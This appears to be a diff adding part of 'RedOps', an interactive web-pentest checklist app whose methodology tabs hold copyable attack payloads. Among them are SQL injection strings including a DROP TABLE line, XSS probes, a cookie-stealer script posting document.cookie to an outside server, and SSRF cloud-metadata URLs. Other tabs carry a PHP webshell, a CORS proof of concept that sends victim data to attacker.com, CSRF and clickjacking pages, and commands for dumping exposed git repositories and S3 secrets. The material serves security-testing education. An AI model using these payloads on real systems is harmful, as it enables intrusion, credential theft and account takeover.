+      {t:'SQL injection — error-based, union-based on all params',s:'HIGH',n:"Test: ' \" ) OR 1=1-- in every input field and URL param"},
+      {t:'Blind SQL injection — time-based and boolean-based',s:'HIGH',n:"SLEEP(5) for MySQL, pg_sleep(5) for PostgreSQL"},
+      {t:'XSS — reflected, stored, DOM-based',s:'HIGH',n:'Use dalfox for automated XSS discovery'},
+      {t:'Command injection in OS-interacting features',s:'HIGH',n:'; id | whoami `id` $(id) for Linux; & whoami for Windows'},
+      {t:'Server-Side Template Injection (SSTI)',s:'HIGH',n:'{{7*7}} ${7*7} <%= 7*7 %> — if 49 returned, escalate to RCE'},
+      {t:'SSRF — internal network and cloud metadata access',s:'HIGH',n:'http://169.254.169.254/latest/meta-data/ for AWS'},
+      {t:'XXE — external entity, blind OOB via Burp Collaborator',s:'HIGH',n:'DOCTYPE SYSTEM "http://collaborator.net/x"'},
+      {t:'LDAP injection on directory-backed login',s:'MED',n:'*)(uid=*))(|(uid=* as username'},
+      {t:'Open redirect via url=, next=, redirect= params',s:'MED',n:'Confirm actual redirect to external host'},
+      {t:'HTTP response splitting / CRLF injection',s:'MED',n:'Inject %0d%0a in header-reflected params'},
+      {t:'File upload: extension bypass, content-type spoof, webshell',s:'HIGH',n:'Upload shell.php as shell.php.jpg with image/jpeg Content-Type'},
+      {t:'Insecure deserialization (Java, PHP, Python pickle)',s:'HIGH',n:'Use ysoserial for Java gadget chains'},
+    ],
+    method:`<h3>Objective</h3>
+<p>Inject malicious input into every processing layer. One confirmed injection in a critical function equals full compromise.</p>
+<h3>SQL Injection</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Manual test payloads</span>
+<span class="str">'</span>                    <span class="comment">-- Error trigger</span>
+<span class="str">''</span>                   <span class="comment">-- Even quotes</span>
+<span class="str">' OR 1=1--</span>          <span class="comment">-- Auth bypass</span>
+<span class="str">' OR '1'='1</span>
+<span class="str">1 AND SLEEP(5)--</span>    <span class="comment">-- Time-based blind</span>
+<span class="str">1; DROP TABLE users--</span>
+
+<span class="comment"># SQLMap automation</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="str">"https://target.com/page?id=1"</span> \
+  <span class="flag">--dbs --batch --level 3 --risk 2</span>
+
+<span class="comment"># POST parameter</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> https://target.com/login \
+  <span class="flag">--data</span> <span class="str">"user=admin&pass=test"</span> <span class="flag">-p user</span></code></div>
+<h3>XSS Payloads</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Basic probes</span>
+<span class="str">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="str">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span>
+<span class="str">'&gt;&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="str">&lt;svg/onload=alert(1)&gt;</span>
+
+<span class="comment"># Cookie stealer payload</span>
+<span class="str">&lt;script&gt;fetch('https://your.server/?c='+document.cookie)&lt;/script&gt;</span>
+
+<span class="comment"># Automated XSS with dalfox</span>
+<span class="cmd">dalfox</span> url <span class="str">"https://target.com/search?q=FUZZ"</span> \
+  <span class="flag">--custom-payload payloads.txt</span></code></div>
+<h3>SSRF</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># AWS metadata endpoint</span>
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+<span class="comment"># GCP metadata</span>
+http://metadata.google.internal/computeMetadata/v1/
+
+<span class="comment"># Azure metadata</span>
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+<span class="comment"># Bypass filters</span>
+http://2130706433/        <span class="comment"># 127.0.0.1 decimal</span>
+http://0x7f000001/        <span class="comment"># 127.0.0.1 hex</span>
+http://localhost.evil.com/ <span class="comment"># DNS rebinding</span></code></div>
+<h3>File Upload Bypass</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Techniques to bypass extension filters</span>
+shell.php.jpg           <span class="comment"># Double extension</span>
+shell.php%00.jpg        <span class="comment"># Null byte (old PHP)</span>
+shell.pHp               <span class="comment"># Case variation</span>
+shell.php5              <span class="comment"># Alternate extension</span>
+shell.phtml             <span class="comment"># Apache alternative</span>
+
+<span class="comment"># Change Content-Type to image/jpeg</span>
+<span class="comment"># Add valid JPEG magic bytes: FF D8 FF</span>
+<span class="comment"># PHP webshell content:</span>
+&lt;?php system($_GET['cmd']); ?&gt;</code></div>
+<div class="tip-box">For blind SSRF and XXE, use Burp Collaborator or interactsh to detect out-of-band callbacks.</div>`
+  },
+  {
+    id:'cors',
+    num:'06',
+    name:'CORS, CSRF & Clickjacking',
+    desc:'Cross-origin attacks and request forgery',
+    icon:'↔',
+    color:'#ff6b7a',
+    bg:'rgba(255,107,122,0.07)',
+    checks:[
+      {t:'CORS: null origin, wildcard, subdomain reflection',s:'HIGH',n:'Add Origin: https://evil.com and check ACAO response header'},
+      {t:'CORS with credentials: ACAC: true + ACAO reflection',s:'HIGH',n:'Exploitable only when both headers present together'},
+      {t:'CSRF on all state-changing POST/PUT/DELETE endpoints',s:'HIGH',n:'Remove token, change token, use different user token'},
+      {t:'CSRF token reuse and cross-user token swap',s:'MED',n:'Can user A token be used in user B session?'},
+      {t:'Clickjacking via iframe embedding',s:'MED',n:'Check X-Frame-Options and CSP frame-ancestors directive'},
+    ],
+    method:`<h3>Objective</h3>
+<p>Exploit cross-origin trust relationships to perform actions on behalf of authenticated users.</p>
+<h3>CORS Exploitation</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Test in Burp Repeater — add Origin header</span>
+Origin: https://evil.com
+Origin: null
+Origin: https://target.com.evil.com
+
+<span class="comment"># Vulnerable response looks like:</span>
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+
+<span class="comment"># CORS PoC exploit page</span>
+&lt;script&gt;
+fetch('https://target.com/api/user', {credentials:'include'})
+  .then(r=&gt;r.text())
+  .then(d=&gt;fetch('https://attacker.com/?data='+btoa(d)))
+&lt;/script&gt;</code></div>
+<h3>CSRF PoC</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment">&lt;!-- CSRF PoC for POST /email/change --&gt;</span>
+&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="https://target.com/email/change" method="POST"&gt;
+    &lt;input name="email" value="attacker@evil.com"&gt;
+    &lt;input name="confirm" value="attacker@evil.com"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></div>
+<h3>Clickjacking PoC</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment">&lt;!-- Iframe overlay PoC --&gt;</span>
+&lt;style&gt;
+  iframe { opacity: 0.0001; position: absolute; top: 300px; left: 60px; }
+  button { position: absolute; top: 300px; left: 60px; }
+&lt;/style&gt;
+&lt;button&gt;Win a prize!&lt;/button&gt;
+&lt;iframe src="https://target.com/account/delete"&gt;&lt;/iframe&gt;</code></div>
+<div class="warn-box">CORS is only exploitable when credentials (cookies/auth headers) are included. A wildcard ACAO alone is not a critical finding.</div>`
+  },
+  {
+    id:'logic',
+    num:'07',
+    name:'Business Logic',
+    desc:'Workflow abuse, race conditions, price manipulation',
+    icon:'⚙',
+    color:'#4df5ff',
+    bg:'rgba(77,245,255,0.06)',
+    checks:[
+      {t:'Price/quantity manipulation in checkout flows',s:'HIGH',n:'Intercept POST, modify price=99.99 → price=0.01 or -1'},
+      {t:'Race conditions on limited-use tokens (coupons, OTPs)',s:'HIGH',n:'Burp Turbo Intruder — send 20 simultaneous requests'},
+      {t:'Multi-step workflow bypass (skip to final step)',s:'HIGH',n:'Go directly to /checkout/confirm without /checkout/cart'},
+      {t:'Coupon/voucher stacking and reuse',s:'MED',n:'Apply same coupon code multiple times'},
+      {t:'Negative value and integer overflow in transactions',s:'MED',n:'Transfer -100 to another user'},
+      {t:'Feature flag and beta endpoint abuse',s:'MED',n:'Check JS for disabled features, try enabling via params'},
+      {t:'Account takeover via chained logic flaws',s:'HIGH',n:'Combine username enum + predictable token + no expiry'},
+    ],
+    method:`<h3>Objective</h3>
+<p>Abuse the application's intended workflows in ways developers never anticipated. These bugs require understanding the business context, not just technical payloads.</p>
+<h3>Race Condition Testing</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Burp Turbo Intruder — simultaneous requests</span>
+<span class="comment"># Use "race_single_packet_attack" template</span>
+
+import requests, concurrent.futures
+
+url = <span class="str">"https://target.com/api/coupon/apply"</span>
+cookies = {<span class="str">"session"</span>: <span class="str">"your_session"</span>}
+data = {<span class="str">"code"</span>: <span class="str">"SAVE50"</span>}
+
+def apply():
+    return requests.post(url, json=data, cookies=cookies)
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+    futures = [ex.submit(apply) for _ in range(20)]
+    for f in concurrent.futures.as_completed(futures):
+        print(f.result().status_code, f.result().text[:100])</code></div>
+<h3>Price Manipulation</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Intercept POST /cart/checkout in Burp Proxy</span>
+<span class="comment"># Original request body:</span>
+{"item_id":42,"qty":1,"price":99.99,"total":99.99}
+
+<span class="comment"># Modified — test all of these:</span>
+{"item_id":42,"qty":1,"price":0.01,"total":0.01}
+{"item_id":42,"qty":-1,"price":99.99,"total":-99.99}
+{"item_id":42,"qty":1,"price":0,"total":0}
+
+<span class="comment"># Also try encoding variations:</span>
+price=99%2E99 → price=0%2E01</code></div>
+<div class="tip-box">Race conditions are often found on: gift card redemptions, referral bonuses, OTP verification, fund transfers, and concurrent purchases.</div>`
+  },
+  {
+    id:'config',
+    num:'08',
+    name:'Security Headers & Misconfig',
+    desc:'Headers, exposed files, cloud storage, debug interfaces',
+    icon:'⚠',
+    color:'#ffb800',
+    bg:'rgba(255,184,0,0.06)',
+    checks:[
+      {t:'Missing security headers: CSP, HSTS, X-Content-Type, Referrer-Policy',s:'MED',n:'curl -I https://target.com | grep -i "content-security\|strict-transport\|x-content"'},
+      {t:'Verbose error messages exposing stack traces or SQL',s:'MED',n:'Send invalid input, check for debug info in response'},
+      {t:'Debug/admin interfaces exposed: /admin, /debug, /phpinfo',s:'HIGH',n:'Combine with directory fuzzing results'},
+      {t:'Dangerous HTTP methods enabled: TRACE, PUT, DELETE',s:'MED',n:'curl -X TRACE https://target.com'},
+      {t:'Directory listing enabled on web directories',s:'MED',n:'Visit /images/, /uploads/, /assets/ — look for index of'},
+      {t:'Cloud storage misconfiguration (public S3, GCS, Azure Blob)',s:'HIGH',n:'aws s3 ls s3://bucket-name --no-sign-request'},
+      {t:'Exposed Git, .env, config files on web root',s:'HIGH',n:'Check /.git/HEAD → if 200 OK, full repo extractable'},
+      {t:'Default framework pages and installation wizards',s:'MED',n:'Laravel debug, Django debug=True, PHP setup pages'},
+    ],
+    method:`<h3>Objective</h3>
+<p>Find configuration mistakes that expose sensitive data or enable exploitation. Often low effort, high impact.</p>
+<h3>Headers Audit</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Quick header check</span>
+<span class="cmd">curl</span> <span class="flag">-sI</span> https://target.com | grep <span class="flag">-iE</span> \
+  <span class="str">"content-security|strict-transport|x-frame|x-content-type|referrer|permissions"</span>
+
+<span class="comment"># Check all headers for missing security fields</span>
+<span class="comment"># Required headers:</span>
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Content-Security-Policy: default-src 'self'
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Referrer-Policy: strict-origin-when-cross-origin</code></div>
+<h3>Git Repository Extraction</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Check if .git is exposed</span>
+<span class="cmd">curl</span> https://target.com/.git/HEAD
+<span class="comment"># If returns "ref: refs/heads/main" — EXPOSED!</span>
+
+<span class="comment"># Extract entire repo with git-dumper</span>
+<span class="cmd">git-dumper</span> https://target.com/.git/ ./output-dir
+
+<span class="comment"># Search for secrets in extracted repo</span>
+<span class="cmd">trufflehog</span> filesystem ./output-dir
+<span class="cmd">gitleaks</span> detect <span class="flag">-s</span> ./output-dir</code></div>
+<h3>Cloud Storage</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># AWS S3</span>
+<span class="cmd">aws s3 ls</span> s3://target-bucket <span class="flag">--no-sign-request</span>
+<span class="cmd">aws s3 cp</span> s3://target-bucket/secrets.txt . <span class="flag">--no-sign-request</span>
+
+<span class="comment"># GCS</span>
+<span class="cmd">gsutil ls</span> gs://target-bucket
+
+<span class="comment"># Find bucket names via recon</span>
+target-prod, target-staging, target-backup, target-dev</code></div>
+<div class="warn-box">A .git exposure is a critical finding — it can leak database credentials, API keys, and full source code.</div>`
+  },
+  {
+    id:'api',
+    num:'09',
+    name:'API-Specific Testing',
+    desc:'REST, GraphQL, BOLA, versioning, rate limits',
+    icon:'⬡',
+    color:'#a855f7',
+    bg:'rgba(168,85,247,0.07)',
+    checks:[
+      {t:'REST endpoint discovery: /api-docs, /swagger.json, /openapi.yaml',s:'HIGH',n:'Also try /v1/, /v2/, /api/v1/users, /api/internal/'},
+      {t:'HTTP verb tampering: GET→DELETE, POST→PUT on resources',s:'HIGH',n:'Test each endpoint with all HTTP methods'},
+      {t:'GraphQL: introspection enabled, batching, IDOR',s:'HIGH',n:'{__schema{types{name}}} to enumerate all types'},
+      {t:'Mass assignment via extra JSON fields in API body',s:'HIGH',n:'Add role, isAdmin, privilege to request body'},
+      {t:'Rate limiting on sensitive endpoints (login, OTP, reset)',s:'MED',n:'Send 100 rapid requests, check for 429 or silent allow'},
+      {t:'API versioning — test v1 for deprecated auth controls',s:'HIGH',n:'v1 endpoints often lack v2 security improvements'},
+      {t:'BOLA/BFLA: access other users objects and functions',s:'HIGH',n:'OWASP API Top 10 A1 (BOLA) and A5 (BFLA)'},
+    ],
+    method:`<h3>Objective</h3>
+<p>APIs often have weaker access controls than UI flows. Test every endpoint independently — don't assume the UI restricts what the API allows.</p>
+<h3>API Endpoint Discovery</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Common API documentation endpoints</span>
+/api-docs          /swagger.json
+/swagger-ui.html   /openapi.yaml
+/graphql           /graphiql
+/api/v1/           /api/internal/
+/.well-known/      /api/schema/
+
+<span class="comment"># Crawl JS files for API endpoints</span>
+<span class="cmd">katana</span> <span class="flag">-u</span> https://target.com <span class="flag">-jc -d</span> 3 | grep api
+
+<span class="comment"># Import Swagger to Burp/Postman for auto-testing</span></code></div>
+<h3>GraphQL Attacks</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Check introspection (should be disabled in prod)</span>
+POST /graphql
+{"query":"{__schema{types{name fields{name}}}}"}
+
+<span class="comment"># GraphQL IDOR — fetch another user's data</span>
+{"query":"{user(id:\"victim-uuid\"){email,phone,address}}"}
+
+<span class="comment"># Batching attack — bypass rate limiting</span>
+[
+  {"query":"mutation{login(user:\"a\",pass:\"1\")}"},
+  {"query":"mutation{login(user:\"a\",pass:\"2\")}"},
+  ... (100 mutations in one HTTP request)
+]</code></div>
+<h3>BOLA Testing</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">copy</button><code><span class="comment"># Broken Object Level Authorization</span>
+<span class="comment"># User A token accessing User B resources</span>
+
+<span class="comment"># Enumerate with sequential IDs</span>
+for i in $(seq 1 100); do
+  curl <span class="flag">-s</span> https://target.com/api/users/$i \
+    <span class="flag">-H</span> <span class="str">"Authorization: Bearer USER_A_TOKEN"</span>
+done
+
+<span class="comment"># Check for UUID patterns in traffic</span>
+<span class="comment"># Test with Burp Intruder on ID parameter</span></code></div>
+<div class="tip-box">Use Postman to import OpenAPI/Swagger specs — it automatically generates a test collection for all documented endpoints.</div>`
+  }
+];
+
+let state = JSON.parse(localStorage.getItem('redops_state') || '{}');
+
+function saveState() { localStorage.setItem('redops_state', JSON.stringify(state)); }
+
+function totalChecks() { return PHASES.reduce((a, p) => a + p.checks.length, 0); }
+function doneChecks() { return Object.values(state).filter(Boolean).length; }
+
+function updateProgress() {
+  const total = totalChecks();
+  const done = doneChecks();
+  const pct = Math.round(done / total * 100);
+  document.getElementById('prog-fill').style.width = pct + '%';
+  document.getElementById('prog-label').textContent = `${done} of ${total} checks`;
+  document.getElementById('prog-pct').textContent = pct + '%';
+  document.getElementById('hero-done').textContent = done;
+  document.getElementById('live-count').textContent = `${done} / ${total} done`;
+}
+
+function updatePhaseBar(phaseId) {
+  const phase = PHASES.find(p => p.id === phaseId);
+  if (!phase) return;
+  const done = phase.checks.filter((_, i) => state[`${phaseId}_${i}`]).length;
+  const pct = Math.round(done / phase.checks.length * 100);
+  const bar = document.getElementById(`bar_${phaseId}`);
+  const cnt = document.getElementById(`cnt_${phaseId}`);
+  if (bar) bar.style.width = pct + '%';
+  if (cnt) cnt.textContent = `${done}/${phase.checks.length}`;
+}
+
+function switchTab(phaseId, tabName) {
+  document.querySelectorAll(`#phase_${phaseId} .tab`).forEach(t => t.classList.remove('active'));
+  document.querySelectorAll(`#phase_${phaseId} .tab-content`).forEach(c => c.classList.remove('active'));
+  document.getElementById(`tab_${phaseId}_${tabName}`).classList.add('active');
+  document.getElementById(`tc_${phaseId}_${tabName}`).classList.add('active');
+}
+
+function buildPhases() {
+  const container = document.getElementById('phases-container');
+  container.innerHTML = '';
+  PHASES.forEach(ph => {
+    const card = document.createElement('div');
+    card.className = 'phase-card';
+    card.id = `phase_${ph.id}`;
+    card.style.setProperty('--phase-color', ph.color);
+    card.style.setProperty('--phase-bg', ph.bg);
+
+    const checklistHTML = ph.checks.map((c, i) => {
+      const key = `${ph.id}_${i}`;
+      const done = state[key] ? ' done' : '';
+      return `<div class="check-item${done}" id="ci_${key}" onclick="toggleCheck('${ph.id}',${i})">
+        <input type="checkbox" id="cb_${key}" ${state[key] ? 'checked' : ''} onclick="event.stopPropagation();toggleCheck('${ph.id}',${i})">
+        <div class="check-body">
+          <div class="check-title">${c.t}</div>
+          ${c.n ? `<div class="check-note">${c.n}</div>` : ''}
+        </div>
+        <span class="sev sev-${c.s}">${c.s}</span>
+      </div>`;
+    }).join('');
+
+    card.innerHTML = `
+      <div class="phase-header" onclick="togglePhase('${ph.id}')">
+        <span class="phase-num">${ph.num}</span>
+        <div class="phase-icon">${ph.icon}</div>
+        <div class="phase-info">
+          <div class="phase-name">${ph.name}</div>
+          <div class="phase-desc">${ph.desc}</div>
+        </div>
+        <div class="phase-stats">
+          <div class="phase-bar-wrap"><div class="phase-bar" id="bar_${ph.id}"></div></div>
+          <span class="phase-count" id="cnt_${ph.id}">0/${ph.checks.length}</span>
+        </div>
+        <span class="phase-toggle">▾</span>
+      </div>
+      <div class="phase-body">
+        <div class="tabs">
+          <button class="tab active" id="tab_${ph.id}_checks" onclick="event.stopPropagation();switchTab('${ph.id}','checks')" style="--phase-color:${ph.color}">Checklist</button>
+          <button class="tab" id="tab_${ph.id}_method" onclick="event.stopPropagation();switchTab('${ph.id}','method')" style="--phase-color:${ph.color}">Methodology</button>
+        </div>
+        <div class="tab-content active" id="tc_${ph.id}_checks">
+          <div class="checklist-wrap">${checklistHTML}</div>
+        </div>
+        <div class="tab-content" id="tc_${ph.id}_method">
+          <div class="method-wrap">${ph.method}</div>
+        </div>
+      </div>`;
+    container.appendChild(card);
+    updatePhaseBar(ph.id);
+  });
+  updateProgress();
+}
+
+function togglePhase(id) {
+  const card = document.getElementById(`phase_${id}`);
+  card.classList.toggle('open');
+}
+
+function toggleCheck(phaseId, idx) {
+  const key = `${phaseId}_${idx}`;
+  state[key] = !state[key];
+  saveState();
+  const cb = document.getElementById(`cb_${key}`);
+  const ci = document.getElementById(`ci_${key}`);
+  if (cb) cb.checked = state[key];
+  if (ci) { state[key] ? ci.classList.add('done') : ci.classList.remove('done'); }
+  updatePhaseBar(phaseId);
+  updateProgress();
+}
+
+function expandAll() {
+  document.querySelectorAll('.phase-card').forEach(c => c.classList.add('open'));
+}
+function collapseAll() {
+  document.querySelectorAll('.phase-card').forEach(c => c.classList.remove('open'));
+}
+function resetAll() {
+  if (!confirm('Reset all checks? This cannot be undone.')) return;
+  state = {};
+  saveState();
+  buildPhases();
+}
+
+function filterChecks(q) {
+  const ql = q.toLowerCase();
+  PHASES.forEach(ph => {
+    ph.checks.forEach((c, i) => {
+      const el = document.getElementById(`ci_${ph.id}_${i}`);
+      if (!el) return;
+      el.style.display = (!q || c.t.toLowerCase().includes(ql) || (c.n && c.n.toLowerCase().includes(ql))) ? '' : 'none';
+    });
+    if (q) document.getElementById(`phase_${ph.id}`)?.classList.add('open');
+  });
+}
+
+function copyCode(btn) {
+  const code = btn.nextElementSibling.innerText;
+  navigator.clipboard.writeText(code).then(() => {
+    btn.textContent = 'copied!';
+    setTimeout(() => btn.textContent = 'copy', 1500);
+  });
+}
+
+function exportReport() {
+  const lines = ['RedOps — Manual Web Pentest Report', '='.repeat(50), `Date: ${new Date().toLocaleDateString()}`, `Progress: ${doneChecks()}/${totalChecks()} checks`, ''];
+  PHASES.forEach(ph => {
+    const done = ph.checks.filter((_, i) => state[`${ph.id}_${i}`]).length;
+    lines.push(`\n[${ph.num}] ${ph.name} (${done}/${ph.checks.length})`);
+    lines.push('-'.repeat(40));
+    ph.checks.forEach((c, i) => {
+      const mark = state[`${ph.id}_${i}`] ? '[x]' : '[ ]';
+      lines.push(`${mark} [${c.s}] ${c.t}`);
+      if (c.n) lines.push(`    → ${c.n}`);
+    });
+  });
+  const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'redops-pentest-report.txt';
+  a.click();
+}
+
+buildPhases();
+</script>
+</body>
+</html>
